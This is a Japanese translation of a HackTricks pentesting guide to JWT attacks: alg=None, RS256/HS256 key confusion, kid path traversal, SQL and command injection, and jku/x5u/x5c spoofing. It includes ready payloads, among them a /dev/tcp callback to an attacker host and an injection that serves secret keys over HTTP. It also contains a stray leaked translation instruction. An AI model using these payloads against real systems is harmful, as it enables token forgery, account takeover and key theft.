# JWTの脆弱性（Json Web Tokens）

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>をご覧ください！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをご覧ください
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォロー**してください。
* **HackTricks**の[**GitHubリポジトリ**](https://github.com/carlospolop/hacktricks)や[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出して、あなたのハッキングのコツを共有してください。

</details>

![](<../.gitbook/assets/image (638) (3).png>)

**バグバウンティのヒント**：**Intigriti**に**登録**してください。ハッカーのために作られたプレミアムな**バグバウンティプラットフォーム**です！今日[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)に参加して、最大**$100,000**のバウンティを獲得し始めましょう！

{% embed url="https://go.intigriti.com/hacktricks" %}

**この投稿の一部はこちらから引用されました：** [**https://github.com/ticarpi/jwt\_tool/wiki/Attack-Methodology**](https://github.com/ticarpi/jwt\_tool/wiki/Attack-Methodology)\
**JWTをペネトレーションテストする素晴らしいツールの作者** [**https://github.com/ticarpi/jwt\_tool**](https://github.com/ticarpi/jwt\_tool)

### **クイックウィン**

[**jwt\_tool**](https://github.com/ticarpi/jwt\_tool)を`All Tests!`モードで実行し、緑色のラインが出るのを待つ
```bash
python3 jwt_tool.py -M at \
-t "https://api.example.com/api/v1/user/76bab5dd-9307-ab04-8123-fda81234245" \
-rh "Authorization: Bearer eyJhbG...<JWT Token>"
```
以下は、JWT（JSON Web Tokens）に関するハッキング技術についてのハッキング本の内容です。関連する英語テキストを日本語に翻訳し、まったく同じマークダウンおよびHTML構文を保ったまま翻訳を返してください。コード、ハッキング技術名、ハッキング用語、クラウド/SaaSプラットフォーム名（Workspace、aws、gcpなど）、'leak'という単語、ペネトレーションテスト、およびマークダウンタグなどの翻訳は行わないでください。また、翻訳とマークダウン構文以外の余計なものは追加しないでください。

---

幸運なことに、ツールがJWTのチェックが不正確に行われているWebアプリケーションのケースを見つけることがあります：

![](<../.gitbook/assets/image (435).png>)

その後、プロキシでリクエストを検索するか、jwt\_toolを使用してそのリクエストに使用されたJWTをダンプできます：
```bash
python3 jwt_tool.py -Q "jwttool_706649b802c9f5e41052062a3787b291"
```
### データを改ざんしても何も変更しない

署名をそのままにしてデータを改ざんし、サーバーが署名をチェックしているかどうかを確認します。例えば、ユーザー名を「admin」に変更してみてください。

#### **トークンはチェックされていますか？**

* エラーメッセージが発生した場合、署名がチェックされています - 漏洩する可能性のある詳細なエラー情報を読んでください。
* 返されたページが異なる場合、署名がチェックされています。
* ページが同じであれば、署名はチェックされていません - Payload claimsを改ざんして何ができるかを見る時です！

### 起源

プロキシのリクエスト履歴でトークンがどこで生成されたかを確認します。サーバーで生成されるべきです。

* クライアント側から最初に見られた場合、**key** はクライアント側のコードにアクセス可能です - 探し出してください！
* サーバーから最初に見られた場合、問題ありません。

### 期間

トークンが24時間以上持続するかどうかを確認します... おそらく期限切れになることはありません。"exp" フィールドがある場合、サーバーが正しく処理しているかを確認します。

### HMACシークレットをブルートフォース

[**このページを見る。**](../generic-methodologies-and-resources/brute-force.md#jwt)

### アルゴリズムをNoneに変更する (CVE-2015-9235)

使用されるアルゴリズムを "None" に設定し、署名部分を削除します。

この脆弱性を試すために "JSON Web Token" というBurp拡張機能を使用し、JWT内の異なる値を変更します（リクエストをRepeaterに送り、"JSON Web Token" タブでトークンの値を変更できます。"Alg" フィールドの値を "None" に設定することもできます）。

### アルゴリズムをRS256（非対称）からHS256（対称）に変更する (CVE-2016-5431/CVE-2016-10555)

HS256アルゴリズムは、各メッセージを署名し検証するためにシークレットキーを使用します。\
RS256アルゴリズムは、メッセージを署名するためにプライベートキーを使用し、認証にはパブリックキーを使用します。

RS256からHS256にアルゴリズムを変更すると、バックエンドコードはパブリックキーをシークレットキーとして使用し、HS256アルゴリズムを使用して署名を検証します。

パブリックキーを使用してRS256をHS256に変更することで、有効な署名を作成できます。次のコマンドを実行して、Webサーバーの証明書を取得できます：
```bash
openssl s_client -connect example.com:443 2>&1 < /dev/null | sed -n '/-----BEGIN/,/-----END/p' > certificatechain.pem #For this attack you can use the JOSEPH Burp extension. In the Repeater, select the JWS tab and select the Key confusion attack. Load the PEM, Update the request and send it. (This extension allows you to send the "non" algorithm attack also). It is also recommended to use the tool jwt_tool with the option 2 as the previous Burp Extension does not always works well.
openssl x509 -pubkey -in certificatechain.pem -noout > pubkey.pem
```
### ヘッダー内の新しい公開鍵

攻撃者はトークンのヘッダーに新しい鍵を埋め込み、サーバーはこの新しい鍵を使用して署名を検証します（CVE-2018-0114）。

これは "JSON Web Tokens" Burp 拡張機能で行うことができます。\
（リクエストをRepeaterに送信し、JSON Web Tokenタブで "CVE-2018-0114" を選択してリクエストを送信します）。

### JWKS スプーフィング

トークンが “jku” ヘッダークレームを使用している場合、提供されたURLをチェックしてください。これは、トークンの検証に使用される公開鍵を保持するJWKSファイルが含まれているURLを指している必要があります。jkuの値を、トラフィックを監視できるWebサービスを指すようにトークンを改ざんします。

HTTPインタラクションを取得した場合、サーバーが提供しているURLから鍵をロードしようとしていることがわかります。_jwt\_toolの-Sフラグと-u_ [_http://example.com_](http://example.com) _引数を使用して新しい鍵ペアを生成し、提供されたURLを注入し、公開鍵を含むJWKSを生成し、プライベート鍵でトークンに署名します_

### Kidの問題

`kid` はオプショナルなヘッダークレームで、特に複数の鍵でトークンに署名する必要がある場合、署名を検証するための正しい鍵を探すのに役立つ鍵識別子を保持します。

#### "kid" の問題 - 鍵の露出

ヘッダーで "kid" クレームが使用されている場合、そのファイルまたはそのバリエーションがWebディレクトリにあるかどうかを確認します。例えば `"kid":"key/12345"` であれば、Webルートで _/key/12345_ と _/key/12345.pem_ を探します。

#### "kid" の問題 - パストラバーサル

ヘッダーで "kid" クレームが使用されている場合、ファイルシステム内の異なるファイルを使用できるかどうかを確認します。予測可能な内容のファイルを選択するか、あるいは `"kid":"/dev/tcp/yourIP/yourPort"` を使用して接続性をテストするか、あるいはいくつかの **SSRF** ペイロードを試してみてください...\
_jwt\_toolの-Tフラグを使用してJWTを改ざんし、kidクレームの値を変更し、元の署名を保持することを選択します_
```bash
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
```
ホスト内に既知の内容を持つファイルを使用して、有効なJWTを偽造することもできます。例えば、Linuxシステムでは、ファイル `/proc/sys/kernel/randomize_va_space` の値は **2** に設定されています。そのため、"**kid**" パラメータにその **パス** を入れ、**対称パスワード** として "**2**" を使用してJWTを生成すると、新しい有効なJWTを生成できるはずです。

#### "kid" の問題 - SQLインジェクション

"kid" の内容がデータベースからパスワードを取得するために使用されるシナリオでは、"kid" パラメータ内のペイロードを `non-existent-index' UNION SELECT 'ATTACKER';-- -` に変更し、秘密鍵 `ATTACKER` でJWTを署名することができます。

#### "kid" の問題 - OSインジェクション

"kid" パラメータに鍵のファイルへのパスが含まれ、このパスが **実行されるコマンド内** で使用されているシナリオでは、次のようなペイロードでRCEを取得し、秘密鍵を露出させることができるかもしれません：`/root/res/keys/secret7.key; cd /root/res/keys/ && python -m SimpleHTTPServer 1337&`

### その他の攻撃

以下はテストされるべき既知の弱点です。

**クロスサービスリレー攻撃**

一部のWebアプリケーションは、信頼されたJWT「サービス」を使用してトークンを生成および管理します。過去には、JWTサービスのクライアントの1つで生成されたトークンが、JWTサービスの別のクライアントによって受け入れられる事例が発生しています。\
JWTがサードパーティサービスを介して発行または更新されていることが観察された場合、そのサービスの別のクライアントで同じユーザー名/メールでアカウントを登録できるかどうかを特定する価値があります。もしそうなら、そのトークンを取得してターゲットへのリクエストで再生してみてください。受け入れられますか？

* トークンが受け入れられた場合、任意のユーザーのアカウントを偽装することができる重大な問題があるかもしれません。ただし、サードパーティのアプリケーションでサインアップする場合、法的なグレーエリアに入る可能性があるため、より広範なテストの許可を求める必要があるかもしれません！

**expがチェックされていますか？**

“exp”ペイロードクレームは、トークンの有効期限をチェックするために使用されます。JWTはしばしばセッション情報がない場合に使用されるため、注意して扱う必要があります - 多くの場合、他人のJWTをキャプチャして再生すると、そのユーザーになりすますことができます。\
JWTリプレイ攻撃に対する1つの緩和策（JWT RFCによって推奨されている）は、“exp”クレームを使用してトークンの有効期限を設定することです。また、この値が処理され、有効期限が切れた場合にトークンが拒否されるように、アプリケーションに適切なチェックを設置することも重要です。トークンに“exp”クレームが含まれていて、テスト時間の制限が許す場合は、トークンを保存して有効期限が過ぎた後に再生してみてください。_jwt\_toolの-Rフラグを使用してトークンの内容を読み取ります。これにはタイムスタンプの解析と有効期限のチェックが含まれています（タイムスタンプはUTCで表示されます）。_

* トークンがアプリケーションでまだ有効である場合、トークンが決して期限切れにならない可能性があるため、セキュリティリスクになるかもしれません。

### x5uとjku

#### jku

jkuは **JWK Set URL** を意味します。\
トークンが “**jku**” **ヘッダー** クレームを使用している場合は、提供されたURLを **確認してください**。これは、トークンの検証に使用される公開鍵を保持するJWKSファイルが含まれているURLを指すべきです。jkuの値を、トラフィックを監視できるWebサービスを指すようにトークンを改ざんしてください。

まず、新しい証明書と新しい秘密鍵 & 公開鍵を作成する必要があります
```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```
以下は、新しいJWTを作成するために、**作成された公開鍵と秘密鍵を使用し、パラメータjkuを作成された証明書に指す**ために例えば[**jwt.io**](https://jwt.io)を使用する方法です。有効なjku証明書を作成するためには、元のものをダウンロードして必要なパラメータを変更することができます。

公開証明書からパラメータ"e"と"n"を取得するには、次の方法を使用します：
```bash
from Crypto.PublicKey import RSA
fp = open("publickey.crt", "r")
key = RSA.importKey(fp.read())
fp.close()
print("n:", hex(key.n))
print("e:", hex(key.e))
```
#### x5u

X.509 URL。PEM形式でエンコードされたX.509（証明書フォーマット標準）の公開証明書セットを指すURI。セットの最初の証明書は、このJWTに署名するために使用されるものでなければなりません。続く証明書はそれぞれ前のものに署名し、証明書チェーンを完成させます。X.509はRFC 52807で定義されています。証明書を転送するためには、トランスポートセキュリティが必要です。

このヘッダーを**自分のコントロール下にあるURLに変更して**、リクエストが受信されるかどうかを確認してください。その場合、**JWTを改ざんすることができます**。

自分がコントロールする証明書を使用して新しいトークンを偽造するには、証明書を作成し、公開鍵と秘密鍵を抽出する必要があります：
```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -out attacker.crt
openssl x509 -pubkey -noout -in attacker.crt > publicKey.pem
```
例えば[**jwt.io**](https://jwt.io)を使用して、**作成された公開鍵と秘密鍵を使い、パラメータx5uを作成された証明書.crtに指定して**、新しいJWTを作成することができます。

![](<../.gitbook/assets/image (439).png>)

これらの脆弱性を**SSRF攻撃に**利用することもできます。

#### x5c

このパラメータには**base64でエンコードされた証明書**が含まれる場合があります：

![](<../.gitbook/assets/image (440).png>)

攻撃者が**自己署名証明書を生成**し、対応する秘密鍵を使用して偽造トークンを作成し、"x5c"パラメータの値を新しく生成された証明書に置き換え、他のパラメータ、すなわちn、e、x5tを変更すると、サーバーによって偽造トークンが受け入れられることになります。
```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -outattacker.crt
openssl x509 -in attacker.crt -text
```
### 埋め込まれた公開鍵 (CVE-2018-0114)

以下のシナリオのように、JWTが公開鍵を埋め込んでいる場合：

![](<../.gitbook/assets/image (438).png>)

次のnodejsスクリプトを使用して、そのデータから公開鍵を生成することが可能です：
```bash
const NodeRSA = require('node-rsa');
const fs = require('fs');
n ="​ANQ3hoFoDxGQMhYOAc6CHmzz6_Z20hiP1Nvl1IN6phLwBj5gLei3e4e-DDmdwQ1zOueacCun0DkX1gMtTTX36jR8CnoBRBUTmNsQ7zaL3jIU4iXeYGuy7WPZ_TQEuAO1ogVQudn2zTXEiQeh-58tuPeTVpKmqZdS3Mpum3l72GHBbqggo_1h3cyvW4j3QM49YbV35aHV3WbwZJXPzWcDoEnCM4EwnqJiKeSpxvaClxQ5nQo3h2WdnV03C5WuLWaBNhDfC_HItdcaZ3pjImAjo4jkkej6mW3eXqtmDX39uZUyvwBzreMWh6uOu9W0DMdGBbfNNWcaR5tSZEGGj2divE8"​;
e = "AQAB";
const key = new NodeRSA();
var importedKey = key.importKey({n: Buffer.from(n, 'base64'),e: Buffer.from(e, 'base64'),}, 'components-public');
console.log(importedKey.exportKey("public"));
```
新しい秘密鍵/公開鍵を生成し、新しい公開鍵をトークン内に埋め込んで、新しい署名を生成することが可能です：
```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```
```markdown
このnodejsスクリプトを使用して、"n"と"e"を取得できます:
```
```bash
const NodeRSA = require('node-rsa');
const fs = require('fs');
keyPair = fs.readFileSync("keypair.pem");
const key = new NodeRSA(keyPair);
const publicComponents = key.exportKey('components-public');
console.log('Parameter n: ', publicComponents.n.toString("hex"));
console.log('Parameter e: ', publicComponents.e.toString(16));
```
公開鍵と秘密鍵、そして新しい「n」と「e」の値を使用して、任意の情報を含む新しい有効なJWTを[jwt.io](https://jwt.io)で偽造することができます。

### JTI (JWT ID)

JTI (JWT ID)クレームは、JWTトークンに一意の識別子を提供します。これはトークンのリプレイを防ぐために使用されることがあります。\
しかし、IDの最大長が4（0001-9999）の場合を想像してください。リクエスト0001と10001は同じIDを使用します。したがって、バックエンドが各リクエストでIDを増加させている場合、**リクエストをリプレイする**ためにこの状況を悪用できます（成功したリプレイごとに10000リクエストを送信する必要があります）。

### JWT 登録済みクレーム

{% embed url="https://www.iana.org/assignments/jwt/jwt.xhtml#claims" %}

### ツール

{% embed url="https://github.com/ticarpi/jwt_tool" %}

<img src="../.gitbook/assets/i3.png" alt="" data-size="original">\
**バグバウンティのヒント**: **Intigriti**に**登録**してください。ハッカーによって作られたプレミアムな**バグバウンティプラットフォーム**です！今日[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)に参加して、最大**$100,000**の報酬を獲得し始めましょう！

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をご覧ください！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手してください。
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見してください。私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)コレクションです。
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォロー**してください。
* **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有**してください。

</details>
